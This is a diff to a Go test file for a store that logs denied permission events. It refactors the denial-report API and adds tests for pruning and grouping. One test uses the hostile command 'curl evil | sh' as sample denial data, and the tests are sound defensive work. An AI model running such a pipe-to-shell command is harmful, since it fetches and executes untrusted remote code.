@@ -31,9 +31,9 @@ func TestPermissionEventsRepeatsAreOneCountedRow(t *testing.T) {
 	if len(rows) != 2 || rows[0].N != 10000 || rows[1].N != 1 || rows[1].Summary != "curl evil | sh" {
 		t.Fatalf("rows = %+v, want one row of 10000 and the later distinct one", rows)
 	}
-	groups, total, more, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour))
-	if err != nil || total != 10001 || more != 0 || len(groups) != 2 || groups[0].Count != 10000 {
-		t.Fatalf("groups %+v total %d notRecorded %d err %v", groups, total, more, err)
+	r, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour), 30)
+	if err != nil || r.Total != 10001 || r.NotRecorded != 0 || len(r.Groups) != 2 || r.Groups[0].Count != 10000 {
+		t.Fatalf("report %+v err %v", r, err)
 	}
 }
 
@@ -52,12 +52,12 @@ func TestPermissionEventsOverflowCountsWhatIsNotKept(t *testing.T) {
 	if err := s.AddPermissionEvent(ctx, denial("b", "other")); err != nil { // another session has its own room
 		t.Fatal(err)
 	}
-	groups, total, more, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour))
-	if err != nil || more != 50 || total != store.PermissionDistinctCap+1+1 {
-		t.Fatalf("total %d notRecorded %d err %v, want %d and 50", total, more, err, store.PermissionDistinctCap+2)
+	r, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour), 1000)
+	if err != nil || r.NotRecorded != 50 || r.Total != store.PermissionDistinctCap+1+1 {
+		t.Fatalf("report total %d notRecorded %d err %v, want %d and 50", r.Total, r.NotRecorded, err, store.PermissionDistinctCap+2)
 	}
-	if groups[0].Summary != "cmd 0" || groups[0].Count != 2 {
-		t.Errorf("first group = %+v, want cmd 0 twice", groups[0])
+	if r.Groups[0].Summary != "cmd 0" || r.Groups[0].Count != 2 {
+		t.Errorf("first group = %+v, want cmd 0 twice", r.Groups[0])
 	}
 }
 
@@ -132,5 +132,57 @@ func TestPruneConfigRevisionsKeepsBaselineAndNewest(t *testing.T) {
 	}
 	if len(revs) != store.ConfigRevisionsKeep+1 || base != 1 {
 		t.Errorf("revisions after prune = %d (baseline %d), want the newest %d plus the baseline", len(revs), base, store.ConfigRevisionsKeep)
+	}
+}
+
+// Rows old by id but kept fresh by repeats must not hide expired rows behind them from the prune.
+func TestPruneFindsExpiredRowsBehindFreshOnes(t *testing.T) {
+	s := open(t, dbPath(t))
+	ctx := context.Background()
+	old := autoT.Add(-store.PermissionEventKeep - time.Hour)
+	for i := range 1100 { // more than one prune batch
+		e := denial(fmt.Sprint("s", i), "keep")
+		e.At = old
+		if err := s.AddPermissionEvent(ctx, e); err != nil {
+			t.Fatal(err)
+		}
+		e.At = autoT // the repeat keeps it fresh
+		if err := s.AddPermissionEvent(ctx, e); err != nil {
+			t.Fatal(err)
+		}
+	}
+	e := denial("gone", "expired")
+	e.At = old
+	if err := s.AddPermissionEvent(ctx, e); err != nil {
+		t.Fatal(err)
+	}
+	if err := s.PruneHistory(ctx, autoT); err != nil {
+		t.Fatal(err)
+	}
+	if rows, _ := s.PermissionEvents(ctx, "gone"); len(rows) != 0 {
+		t.Fatalf("an expired row behind 1100 fresh ones was not pruned: %+v", rows)
+	}
+	if rows, _ := s.PermissionEvents(ctx, "s0"); len(rows) != 1 {
+		t.Errorf("a fresh row was pruned: %+v", rows)
+	}
+}
+
+// Groups are listed by first sight, so repeats cannot push a distinct refusal off the list, and the groups left out are counted.
+func TestDenialsListByFirstSeenAndCountWhatIsOmitted(t *testing.T) {
+	s := open(t, dbPath(t))
+	ctx := context.Background()
+	for i := range 31 {
+		if err := s.AddPermissionEvent(ctx, denial("a", fmt.Sprintf("cmd %02d", i))); err != nil {
+			t.Fatal(err)
+		}
+	}
+	for range 500 { // the last group repeats a lot
+		if err := s.AddPermissionEvent(ctx, denial("a", "cmd 30")); err != nil {
+			t.Fatal(err)
+		}
+	}
+	r, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour), 30)
+	if err != nil || len(r.Groups) != 30 || r.Omitted != 1 || r.Groups[0].Summary != "cmd 00" || r.Groups[29].Summary != "cmd 29" {
+		t.Fatalf("groups %d omitted %d err %v (first %q): want the first 30 seen and 1 omitted", len(r.Groups), r.Omitted, err, r.Groups[0].Summary)
 	}
 }
